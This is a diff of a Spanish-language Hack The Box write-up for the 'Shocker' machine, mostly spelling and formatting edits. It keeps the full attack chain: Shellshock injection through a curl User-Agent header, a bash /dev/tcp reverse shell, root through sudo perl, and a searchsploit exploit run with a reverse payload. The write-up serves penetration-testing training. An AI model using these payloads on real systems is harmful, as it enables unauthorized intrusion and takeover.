@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Shocker - Hack The Box
-excerpt: "Esta fue una máquina algo compleja porque tuve que investigar bastante, pues al hacer los escaneos no mostraba nada que me pudiera ayudar. Sin embargo, gracias al fuzzing pude encontrar una linea de investigación que me llevo a descubrir el **ataque ShellShock**, gracias a este podremos conectarnos de manera remota a la maquina y usando un archivo con privilegios root, escalaremos privilegios."
+excerpt: "Esta fue una máquina algo compleja porque tuve que investigar bastante, pues al hacer los escaneos no mostraba nada que me pudiera ayudar. Sin embargo, gracias al Fuzzing pude encontrar una línea de investigación que me llevo a descubrir el ataque ShellShock, gracias a este podremos conectarnos de manera remota a la máquina y usando un archivo con privilegios Root, escalaremos privilegios."
 date: 2023-03-07
 classes: wide
 header:
@@ -22,11 +22,11 @@ tags:
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-shocker/shocker_logo.png)
-Esta fue una máquina algo compleja porque tuve que investigar bastante, pues al hacer los escaneos no mostraba nada que me pudiera ayudar. Sin embargo, gracias al fuzzing pude encontrar una linea de investigación que me llevo a descubrir el **ataque ShellShock**, gracias a este podremos conectarnos de manera remota a la maquina y usando un archivo con privilegios root, escalaremos privilegios.
+Esta fue una máquina algo compleja porque tuve que investigar bastante, pues al hacer los escaneos no mostraba nada que me pudiera ayudar. Sin embargo, gracias al **Fuzzing** pude encontrar una linea de investigación que me llevo a descubrir el **ataque ShellShock**. Gracias a este podremos conectarnos de manera remota a la máquina y usando un archivo con privilegios Root, escalaremos privilegios.
 
 # Recopilación de Información
 ## Traza ICMP
-Vamos a realizar un ping para saber si la máquina esta conectada y en base al TTL vamos a saber que SO tiene.
+Vamos a realizar un ping para saber si la máquina está conectada y en base al TTL vamos a saber que SO tiene.
 ```
 ping -c 4 10.10.10.56
 PING 10.10.10.56 (10.10.10.56) 56(84) bytes of data.
@@ -71,7 +71,7 @@ Nmap done: 1 IP address (1 host up) scanned in 28.21 seconds
 * -Pn: Para indicar que se omita el descubrimiento de hosts.
 * -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
 
-Solamente hay un puerto abierto, ya sabemos que es una página web pero aun asi hagamos un escaneo de servicios.
+Solamente hay un puerto abierto, ya sabemos que es una página web pero aun así hagamos un escaneo de servicios.
 
 ## Escaneo de Servicios
 ```
@@ -93,19 +93,21 @@ Nmap done: 1 IP address (1 host up) scanned in 10.84 seconds
 * -p: Para indicar puertos específicos.
 * -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-Ya sabiamos que es una página web, entonces vamos a verla.
+Ya sabíamos que es una página web, entonces vamos a verla.
 
-# Analisis de Vulnerabilidades
+# Análisis de Vulnerabilidades
 ## Analizando Puerto 80
 Vamos a entrar.
 
 ![](/assets/images/htb-writeup-shocker/Captura1.png)
 
-Jejeje que raro el monito ese, pero no hay nada más. Que nos dice Wappalizer:
+Jejeje que raro el monito ese, pero no hay nada más. Que nos dice **Wappalizer**:
 
 ![](/assets/images/htb-writeup-shocker/Captura2.png)
 
-No pues nada, no tenemos casi nada de información. Vamos a hacer un fuzzing para ver si tiene alguna subpágina:
+No pues nada, no tenemos casi nada de información. Vamos a hacer un fuzzing para ver si tiene alguna subpágina.
+
+## Fuzzing
 ```
 wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.56/FUZZ/   
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -145,30 +147,30 @@ Filtered Requests: 220542
 Requests/sec.: 171.5391
 ```
 * -c: Para que se muestren los resultados con colores.
-* --hc: Para que no muestre el codigo de estado 404, hc = hide code.
-* -t: Para usar una cantidad especifica de hilos.
+* --hc: Para que no muestre el código de estado 404, hc = hide code.
+* -t: Para usar una cantidad específica de hilos.
 * -w: Para usar un diccionario de wordlist.
 * Diccionario que usamos: dirbuster
 
-Mmmm hay algunas que son de interes como la cgi-bin pero por el estado que muestra, no las podremos ver aunque sabemos que si existen. Que podemos hacer ahora?
+Mmmm hay algunas que son de interés como la **cgi-bin** pero por el estado que muestra, no las podremos ver aunque sabemos que si existen. ¿Qué podemos hacer ahora?
 
-Pues toca investigar, quiza el **cgi-bin** tenga un exploit, vamos a buscar. Encontre algo gracias a **HackTricks**:
+Pues toca investigar, quizá el **cgi-bin** tenga un Exploit, vamos a buscar. Encontré algo gracias a **HackTricks**:
 
 * https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi
 
-Aqui se habla sobre el ataque **ShellShock** pero esto que es?
+Aquí se habla sobre el **ataque ShellShock**, pero ¿esto que es?
 
 **Shellshock es una vulnerabilidad asociada al CVE-2014-6271 y afecta a la shell de Linux “Bash” hasta la versión 4.3. Esta vulnerabilidad permite una ejecución arbitraria de comandos.**
 
-Aqui más información importante que nos da **OWASP**:
+Aquí más información importante que nos da **OWASP**:
 
 * https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf
 
-Incluso menciona que existe un script en **nmap** para detectar si una victima, en este caso el servidor web de Apache, es vulnerable al **ataque ShellShock**, para que este funciones debemos averiguar si existe el directorio **cgi-bin** y el archivo **user.sh**, nosotros ya encontramos el **cgi-bin** pero no el **user.sh**, veamos que pasa si lo ponemos junto al **cgi-bin** en el buscado:
+Incluso menciona que existe un script en **nmap** para detectar si una víctima, en este caso el servidor web de **Apache**, es vulnerable al **ataque ShellShock**, para que este funcione, debemos averiguar si existe el directorio **cgi-bin** y el archivo **user.sh**, nosotros ya encontramos el **cgi-bin** pero no el **user.sh**, veamos que pasa si lo ponemos junto al **cgi-bin** en el buscado:
 
 ![](/assets/images/htb-writeup-shocker/Captura3.png)
 
-Nos descargo un archivo, vamos a verlo:
+Nos descargó un archivo, vamos a verlo:
 ```
 cat user.sh       
 Content-Type: text/plain
@@ -177,7 +179,7 @@ Just an uptime test script
 
  18:52:25 up  3:47,  0 users,  load average: 0.01, 0.02, 0.00
 ```
-Excelente! Dicho archivo si existe, es momento de probar el script de nmap:
+¡Excelente! Dicho archivo si existe, es momento de probar el script de nmap:
 ```
 nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-05 20:07 CST
@@ -213,7 +215,7 @@ Aqui la página de nmap de donde saque el script:
 Y si es vulnerable, vamos a utilizar este ataque para ganar acceso a la máquina.
 
 # Explotación de Vulnerabilidades
-Despues de leer el siguiente articulo:
+Después de leer el siguiente artículo:
 
 * https://blog.cloudflare.com/inside-shellshock/
 
@@ -242,14 +244,14 @@ Nos manda un error, he visto en ejemplos que usan el comando **echo** quiza por 
 curl -H "User-Agent: () { :; }; echo; /usr/bin/whoami" 'http://10.10.10.56/cgi-bin/user.sh'    
 shelly
 ```
-Muy bien, para que quede más claro de que podemos inyectar comandos, lanzemos una Traza ICMP para probarlo:
-* Activamos un capturador con **tcpdum**:
+Muy bien, para que quede más claro de que podemos inyectar comandos, lancemos una Traza ICMP para probarlo:
+* Activamos un capturador con **tcpdump**:
 ```
 tcpdump -i tun0 icmp -n
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 ```
-* Escribimos la petición para mandar un ping con curl:
+* Escribimos la petición para mandar un ping con **curl**:
 ```
 curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'ping -c 4 10.10.14.16'" 'http://10.10.10.56/cgi-bin/user.sh'
 ```
@@ -267,19 +269,17 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 20:32:48.342873 IP 10.10.10.56 > 10.10.14.16: ICMP echo request, id 1578, seq 4, length 64
 20:32:48.342884 IP 10.10.14.16 > 10.10.10.56: ICMP echo reply, id 1578, seq 4, length 64
 ```
-Muy bien, ahora aqui podemos hacer dos cosas, una seria cargar un payload con una Reverse Shell para que nos conecte o directamente pedirle esa conexión sin cargar el Payload, hagamos lo segundo:
+Muy bien, ahora aquí podemos hacer dos cosas, una seria cargar un Payload con una Reverse Shell para que nos conecte o directamente pedirle esa conexión sin cargar el Payload, hagamos lo segundo:
 + Activamos una netcat:
 ```
 nc -nvlp 443                                                                         
 listening on [any] 443 ...
 ```
-* Agregamos la Reverse Shell en el comando de curl:
+* Agregamos la Reverse Shell en el comando de **curl**:
 ```
 curl -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/Tu_IP/443 0>&1" 'http://10.10.10.56/cgi-bin/user.sh'
 ```
-Aqui nos apoyamos de la siguiente página web que te genera Reverse Shells en casi cualquier lenguaje:
-
-* https://www.revshells.com/
+* Aquí nos apoyamos de la siguiente página web que te genera Reverse Shells en casi cualquier lenguaje:  https://www.revshells.com/
 
 * Activamos el comando y vemos el resultado:
 ```
@@ -291,7 +291,7 @@ shelly@Shocker:/usr/lib/cgi-bin$ whoami
 whoami
 shelly
 ```
-Y estamos dentro! Busquemos la flag del usuario:
+¡Y estamos dentro! Busquemos la flag del usuario:
 ```
 shelly@Shocker:/usr/lib/cgi-bin$ cd /home
 cd /home
@@ -315,7 +315,7 @@ shelly@Shocker:/home/shelly$ id
 id
 uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
 ```
-No veo algo que nos pueda servir, aunque me llama la atención el plugdev, el lxd y lpadmin. Antes de investigarlos, veamos si tenemos algún permiso como SUDO en un archivo:
+No veo algo que nos pueda servir, aunque me llama la atención el **plugdev**, el **lxd** y **lpadmin**. Antes de investigarlos, veamos si tenemos algún permiso como **SUDO** en un archivo:
 ```
 shelly@Shocker:/home/shelly$ sudo -l
 sudo -l
@@ -326,11 +326,11 @@ Matching Defaults entries for shelly on Shocker:
 User shelly may run the following commands on Shocker:
     (root) NOPASSWD: /usr/bin/perl
 ```
-Podemos ejecutar **perl** como root, busquemos en GTObins si hay alguna forma de escalar privilegios.
+Podemos ejecutar **perl** como Root, busquemos en **GTObins** si hay alguna forma de escalar privilegios.
 
 * https://gtfobins.github.io/gtfobins/perl/#sudo
 
-Si hay una forma, intentemosla:
+Si hay una forma, intentémosla:
 ```
 shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
 sudo perl -e 'exec "/bin/sh";'
@@ -344,7 +344,7 @@ cat root.txt
 Listo! Ya conseguimos las flags de esta máquina.
 
 # Otras Formas
-Existe un exploit que podemos usar para poder conectarnos de manera remota, busquemoslo con **Searchsploit**:
+Existe un Exploit que podemos usar para poder conectarnos de manera remota, busquémoslo con **Searchsploit**:
 ```
 searchsploit shellshock
 ------------------------------------------------------------------------------------------------------------ ---------------------------------
@@ -372,7 +372,7 @@ searchsploit -m linux/remote/34900.py
  Verified: True
 File Type: Python script, ASCII text executable
 ```
-Bien, si lo analizamos vienen instrucciones sobre como usarlo:
+Bien, si lo analizamos vienen instrucciones sobre cómo usarlo:
 ```
 python2 Shellshock.py                            
 
@@ -403,7 +403,7 @@ Credits:
 
 Federico Galatolo 2014
 ```
-Osea que con activarlo va a generar un payload con una Reverse Shell y activara una netcat que nos conectara automaticamente, hagamoslo:
+Ósea que con activarlo va a generar un Payload con una Reverse Shell y activara una netcat que nos conectara automáticamente, hagámoslo:
 ```
  python2 Shellshock.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.16 lport=443 pages=/cgi-bin/user.sh
 [!] Started reverse shell handler
@@ -415,7 +415,7 @@ shelly
 ```
 Y listo estamos dentro.
 
-Ahora para escalar privilegios, existe un exploit hecho por tito **S4vitar** y **vowkin** en donde el epxloit abusa del privilegio **lxd**, intenta usarlo!
+Ahora para escalar privilegios, existe un Exploit hecho por tito **S4vitar** y **vowkin** en donde el Exploit abusa del privilegio **lxd**. ¡Intenta usarlo!
 
 ```
 searchsploit lxd
